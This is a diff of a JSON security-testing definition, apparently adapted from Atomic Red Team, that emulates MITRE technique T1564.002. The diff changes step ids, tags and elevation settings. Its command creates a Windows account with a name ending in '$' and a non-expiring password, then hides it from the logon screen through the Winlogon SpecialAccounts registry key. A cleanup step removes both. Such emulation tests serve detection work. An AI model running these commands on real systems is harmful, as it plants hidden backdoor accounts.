@@ -7,39 +7,39 @@
   ],
   "steps": [
     {
-      "id": "ececd838-9a17-4cc5-9fed-e95f34713c52",
+      "id": "d612b8fb-240f-4b60-9bd7-cefa3a0ef5e1",
       "type": "execute-command",
       "data": {
         "command": "NET USER #{user_name}$ #{user_password} /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /t REG_DWORD /d 0\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "82720d58-d077-47a8-83e8-9418b72bb753",
+      "id": "d5d1c926-62b3-44da-92ae-5084367ccca2",
       "type": "execute-command",
       "data": {
         "command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /f \u003enul 2\u003e\u00261\nnet user ${user_name}$ /delete \u003enul 2\u003e\u00261\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "ececd838-9a17-4cc5-9fed-e95f34713c52",
+      "s": "d612b8fb-240f-4b60-9bd7-cefa3a0ef5e1",
       "p": "on-success",
-      "o": "82720d58-d077-47a8-83e8-9418b72bb753"
+      "o": "d5d1c926-62b3-44da-92ae-5084367ccca2"
     },
     {
-      "s": "ececd838-9a17-4cc5-9fed-e95f34713c52",
+      "s": "d612b8fb-240f-4b60-9bd7-cefa3a0ef5e1",
       "p": "on-failure",
-      "o": "82720d58-d077-47a8-83e8-9418b72bb753"
+      "o": "d5d1c926-62b3-44da-92ae-5084367ccca2"
     }
   ],
   "tags": [
-    "T1564.002",
-    "atomic-red-team"
+    "T1564",
+    "T1564.002"
   ],
   "input_arguments": [
     {
